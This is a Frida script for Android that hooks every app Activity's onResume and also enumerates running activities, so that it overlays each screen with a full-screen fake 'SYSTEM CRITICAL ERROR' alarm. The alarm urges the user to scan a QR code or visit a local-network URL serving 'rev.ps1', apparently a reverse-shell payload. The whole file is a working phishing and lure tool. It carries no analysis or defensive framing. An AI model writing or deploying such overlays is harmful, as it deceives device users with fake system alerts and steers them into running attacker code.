// dude_custom_overlay.js
Java.perform(function() {
    console.log("[*] DUDE: Injecting QR Code Bait Overlay...");
    
    var Activity = Java.use("android.app.Activity");
    var TextView = Java.use("android.widget.TextView");
    var Color = Java.use("android.graphics.Color");
    var Gravity = Java.use("android.view.Gravity");
    var FrameLayout = Java.use("android.widget.FrameLayout");
    var String = Java.use("java.lang.String");

    function slap(activity) {
        if (!activity) return;
        Java.scheduleOnMainThread(function() {
            try {
                var window = activity.getWindow();
                if (!window) return;
                var decor = window.getDecorView();
                if (!decor || decor.findViewWithTag("DUDE_QR")) return;

                var tv = TextView.$new(activity);
                tv.setTag("DUDE_QR");
                
                // Simulating a QR Code prompt
                var text = String.$new("\n\n⚠️ SYSTEM CRITICAL ERROR ⚠️\n\nSCAN TO RECOVER DEVICE:\n\n[ QR CODE PLACEHOLDER ]\n\nOR VISIT:\nhttp://192.168.0.34:8000/rev.ps1\n\n");
                tv.setText(text);
                
                tv.setTextColor(Color.RED.value);
                tv.setBackgroundColor(Color.BLACK.value);
                tv.setGravity(Gravity.CENTER.value);
                tv.setTextSize(20);
                
                // Make it cover the screen
                var params = FrameLayout.LayoutParams.$new(-1, -1, Gravity.CENTER.value);
                activity.addContentView(tv, params);
                console.log("[+] DUDE: QR Bait Overlay deployed on " + activity.getClass().getName());
            } catch (e) {
                // console.log("[-] Slap failed: " + e.message);
            }
        });
    }

    Activity.onResume.implementation = function() {
        this.onResume();
        slap(this);
    };

    // Hunt once at start
    Java.choose("android.app.Activity", {
        onMatch: function(instance) {
            slap(instance);
        },
        onComplete: function() {}
    });
});